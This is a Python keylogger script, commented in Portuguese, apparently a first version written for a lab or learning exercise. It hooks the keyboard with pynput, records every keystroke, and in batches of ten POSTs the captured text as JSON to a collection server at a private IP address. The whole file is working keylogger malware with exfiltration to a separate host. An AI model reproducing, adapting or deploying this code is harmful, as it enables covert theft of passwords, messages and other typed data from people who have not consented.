#!/usr/bin/env python3
from pynput import keyboard
import requests
import time
import threading

# Configurações
SERVIDOR_URL = "http://192.168.18.59:5000/logs"
MAX_TECLAS = 10  


class KeyloggerSimples:
    def __init__(self, url_servidor, max_teclas=10):
        self.url_servidor = url_servidor
        self.max_teclas = max_teclas
        self.teclas_capturadas = []
        self.lock = threading.Lock()

    def processar_tecla(self, tecla):
        try:
            caractere = tecla.char
        except AttributeError:
            if tecla == keyboard.Key.space:
                caractere = ' '
            elif tecla == keyboard.Key.enter:
                caractere = '\n'
            elif tecla == keyboard.Key.tab:
                caractere = '\t'
            elif tecla == keyboard.Key.backspace:
                caractere = '[BACKSPACE]'
            else:
                caractere = f'[{tecla.name.upper()}]'

        with self.lock:
            self.teclas_capturadas.append(caractere)
            print(f"Tecla capturada: {caractere}")

            if len(self.teclas_capturadas) >= self.max_teclas:
                self.enviar_dados()

    def enviar_dados(self):
        if not self.teclas_capturadas:
            return

        dados = ''.join(self.teclas_capturadas)
        self.teclas_capturadas = []

        try:
            print(f"\n[*] Enviando dados para {self.url_servidor}...")
            print(f"[*] Conteúdo: {dados[:50]}..." if len(dados) > 50 else f"[*] Conteúdo: {dados}")

            resposta = requests.post(
                self.url_servidor,
                json={'dados': dados, 'timestamp': time.time()},
                timeout=5
            )

            if resposta.status_code == 200:
                print(f"[✓] Dados enviados com sucesso!")
            else:
                print(f"[!] Erro ao enviar: Status {resposta.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Erro de conexão: {e}")
            with self.lock:
                self.teclas_capturadas.insert(0, dados)

    def ao_pressionar(self, tecla):
        self.processar_tecla(tecla)

    def iniciar(self):
        print("=" * 60)
        print("KEYLOGGER V1 - SEM CRIPTOGRAFIA")
        print("=" * 60)
        print(f"[*] Servidor: {self.url_servidor}")
        print(f"[*] Máximo de teclas antes do envio: {self.max_teclas}")
        print("[*] Iniciando captura de teclas...")
        print("[*] Pressione Ctrl+C para parar")
        print("=" * 60)

        with keyboard.Listener(on_press=self.ao_pressionar) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                print("\n[*] Encerrando keylogger...")
                with self.lock:
                    if self.teclas_capturadas:
                        self.enviar_dados()


if __name__ == "__main__":
    keylogger = KeyloggerSimples(
        url_servidor=SERVIDOR_URL,
        max_teclas=MAX_TECLAS
    )

    try:
        keylogger.iniciar()
    except KeyboardInterrupt:
        print("\n[*] Programa encerrado pelo usuário.")
